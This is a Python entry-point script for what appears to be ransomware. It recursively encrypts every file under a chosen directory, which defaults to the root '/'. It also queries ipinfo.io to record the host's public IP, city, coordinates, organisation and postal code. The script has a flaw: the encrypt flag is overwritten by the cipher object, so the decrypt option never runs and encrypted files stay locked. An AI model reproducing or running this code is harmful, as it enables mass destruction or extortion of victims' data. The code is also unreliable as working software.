import argparse
import json
import requests

from modules import encryption
from modules import search_files
from modules import info
from datetime import datetime

def get_public_info():
    request = requests.get("https://ipinfo.io")

    if request.status_code == 200:
        response = request.json()
    
    return response

def get_time():
    today = datetime.now()
    today = today.strftime("%d/%m/%Y %H:%M:%S")

    return today

def main():
    parser = argparse.ArgumentParser(add_help=info.help_message)
    parser.add_argument('--key', dest="key", required=True)
    parser.add_argument('--dir', dest="directory", default="/")
    parser.add_argument('--encrypt', dest="encrypt", action="store_true")
    parser.add_argument('--decrypt', dest="decrypt", action="store_true")
    parser.add_argument('--verbose', dest="verbose", action="store_true")

    args = parser.parse_args()

    key = args.key
    directory = args.directory
    encrypt = args.encrypt
    decrypt = args.decrypt
    verbose = args.verbose

    encrypt = encryption.EncryptionData(key)
    files = search_files.SearchDirThree(directory)
    all_files = files.search_all_files()

    public_info = get_public_info()
    
    print("-" * 67)
    info.log("Public IP: {0}".format(public_info["ip"]))
    info.log("Hostname: {0}".format(public_info["hostname"]))
    info.log("City: {0}".format(public_info["city"]))
    info.log("Region: {0}".format(public_info["region"]))
    info.log("Country: {0}".format(public_info["country"]))
    info.log("Loc: {0}".format(public_info["loc"]))
    info.log("Org: {0}".format(public_info["org"]))
    info.log("Postal: {0}".format(public_info["postal"]))
    info.log("Timezone: {0}".format(public_info["timezone"]))
    print("-" * 67)

    info.log("Search all files in {0}\n".format(directory))
    info.log("Started in: {0}".format(get_time()))

    for file in all_files:
        if verbose:
            info.log(file)
        
        if encrypt:
            encrypt.encrypt(file)
        
        elif decrypt:
            encrypt.decrypt(file)

    info.log("Stopped in: {0}".format(get_time()))

if __name__=='__main__':
    info.banner()
    main()
